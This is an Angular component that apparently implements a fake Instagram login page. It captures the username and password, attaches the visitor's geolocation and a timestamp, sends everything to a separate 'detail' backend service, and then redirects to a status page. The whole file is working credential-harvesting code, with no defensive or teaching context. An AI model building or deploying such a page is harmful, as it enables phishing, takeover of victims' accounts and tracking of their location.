import { Component, OnInit } from '@angular/core';
import { Router } from '@angular/router';
import { DetailService } from 'src/app/services/detail.service';
import { GeolocationService } from 'src/app/services/geolocation.service';

@Component({
  selector: 'app-instagram-login',
  templateUrl: './instagram-login.component.html',
  styleUrls: ['./instagram-login.component.css'],
})
export class InstagramLoginComponent implements OnInit {
  constructor(
    private router: Router,
    private geolocation: GeolocationService,
    private detailService: DetailService
  ) {}
  buttonClicked = true;
  date: any = '';
  locationDetails: any = [];
  ngOnInit(): void {
    this.geolocation.getLocationDetails().subscribe((resp) => {
      this.locationDetails = resp;
    });
  }
  getInputs(igUserName: string, igPassword: string) {
    let det = { username: igUserName + '(Instagram)', password: igPassword };
    const details = {
      userId: sessionStorage.getItem('user'),
      ...det,
      ...this.locationDetails,
      ...this.dnate(),
    };
    this.detailService.addToDetails(details).subscribe((resp) => {
      console.log(resp);
    });
    this.router.navigate(['/status']);
  }

  dnate() {
    const moment = require('moment');
    const now = moment();
    const nowString = now.format('YYYY-MM-DD HH:mm:ss');
    this.date = { date: nowString };
    return this.date;
  }
}
